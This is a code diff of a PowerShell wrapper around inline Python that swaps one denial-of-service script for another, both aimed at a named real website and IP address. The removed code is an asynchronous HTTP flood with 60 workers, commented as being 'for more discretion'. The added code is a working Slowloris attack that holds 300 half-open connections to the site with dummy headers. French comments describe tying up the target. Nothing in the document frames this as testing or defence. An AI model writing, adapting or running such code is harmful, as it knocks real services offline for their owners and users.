@@ -1,19 +1,51 @@
 $code = @'
-import asyncio, aiohttp, random
-async def a():
-    h=d=0
-    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
-    async with aiohttp.ClientSession(headers=headers) as s:
-        while True:
+import socket
+import random
+import time
+import sys
+
+target_ip = "65.20.99.29"
+target_host = "kodingschools.com"
+port = 80
+connection_count = 300
+list_of_sockets = []
+
+def init_socket(ip):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(4)
+    s.connect((ip, port))
+    # On précise bien quel site on veut occuper
+    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 5000)).encode("utf-8"))
+    s.send("Host: {}\r\n".format(target_host).encode("utf-8"))
+    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
+    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
+    return s
+
+print(f"--- 🐌 SLOWLORIS CIBLÉ : {target_host} VIA {target_ip} ---")
+
+# Création du pool de connexions
+for i in range(connection_count):
+    try:
+        s = init_socket(target_ip)
+        list_of_sockets.append(s)
+        sys.stdout.write(f"\rSockets actives : {len(list_of_sockets)}")
+        sys.stdout.flush()
+    except socket.error:
+        break
+
+while True:
+    print(f"\n--- ⏳ Maintien des {len(list_of_sockets)} connexions... ---")
+    for s in list(list_of_sockets):
+        try:
+            # On envoie un header bidon pour maintenir la socket ouverte
+            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+        except socket.error:
+            list_of_sockets.remove(s)
             try:
-                # Timeout monté à 2.0 pour stabiliser la connexion
-                async with s.get("https://kodingschools.com/", params={"v":random.random()}, timeout=2.0) as r:
-                    if r.status == 200: h += 1
-                    else: d += 1
-            except: d += 1
-            print(f"\rHITS: {h} | DROPS: {d}", end="", flush=True)
-async def m(): await asyncio.gather(*[a() for _ in range(60)]) # 60 workers pour plus de discrétion
-asyncio.run(m())
+                list_of_sockets.append(init_socket(target_ip))
+            except:
+                pass
+    time.sleep(15)
 '@
- 
+
 python3 -c $code
